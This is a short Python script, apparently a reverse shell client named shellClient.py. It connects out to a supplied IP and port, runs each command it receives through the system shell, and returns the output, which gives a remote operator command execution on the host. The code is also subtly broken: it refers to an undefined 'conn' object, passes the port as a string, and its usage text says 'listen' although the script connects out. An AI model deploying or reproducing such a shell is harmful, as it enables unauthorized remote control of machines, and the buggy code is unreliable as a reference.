import socket
import sys
import subprocess

def run(HOST, PORT):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        while True:
            cmd = conn.recv(1024).decode().strip()
            if not cmd or cmd.lower() == "exit":
                break
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                output = e.output
            conn.sendall(output)
            
if not (len(sys.argv) == 3):
    print("Usage: shellClient.py {ip to listen on} {port to listen on}")
elif not ((len(sys.argv[1].split('.')) == 4) and (int(sys.argv[2]) > 0 and int(sys.argv[2]) <= 510)):
    print("Invalid IP or port. Note: port range is between 1-510")
else:
    run(sys.argv[1], sys.argv[2])